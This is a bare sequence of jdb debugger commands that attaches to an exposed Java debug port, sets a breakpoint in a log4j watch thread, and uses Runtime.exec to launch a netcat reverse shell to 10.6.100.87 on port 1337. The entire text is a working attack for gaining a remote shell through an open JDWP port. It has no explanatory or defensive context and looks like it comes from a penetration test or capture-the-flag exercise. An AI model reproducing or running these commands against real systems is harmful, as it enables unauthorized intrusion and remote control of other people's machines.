
jdb -attach 127.0.0.1:18001
classpath
classes
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
print new java.lang.Runtime().exec("nc 10.6.100.87 1337 -e /bin/sh")